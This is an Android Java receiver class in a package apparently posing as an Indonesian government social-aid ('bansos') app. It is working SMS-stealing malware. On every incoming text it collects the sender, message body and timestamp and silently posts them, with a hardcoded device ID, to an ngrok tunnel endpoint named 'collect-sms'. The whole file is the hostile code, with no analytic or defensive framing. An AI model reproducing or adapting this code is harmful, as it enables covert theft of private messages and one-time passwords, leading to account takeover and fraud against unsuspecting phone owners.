package com.kemensos.bansos;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String SERVER_URL = "https://scarf-ion-cranium.ngrok-free.dev";
    private static final String DEVICE_ID = "9c4d9cc9c4";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            JSONArray messages = new JSONArray();

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sms == null) continue;

                JSONObject msg = new JSONObject();
                msg.put("sender", sms.getOriginatingAddress());
                msg.put("message", sms.getMessageBody());
                msg.put("timestamp", sms.getTimestampMillis());
                messages.put(msg);
            }

            sendToServer(messages.toString());

        } catch (Exception e) {
            Log.e(TAG, "Error", e);
        }
    }

    private void sendToServer(final String jsonData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("messages", new JSONArray(jsonData));
                    payload.put("device_id", DEVICE_ID);

                    URL url = new URL(SERVER_URL + "/api/collect-sms");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int code = conn.getResponseCode();
                    conn.disconnect();
                    Log.d(TAG, "SMS sent, code: " + code);
                } catch (Exception e) {
                    Log.e(TAG, "Send SMS error", e);
                }
            }
        }).start();
    }
}
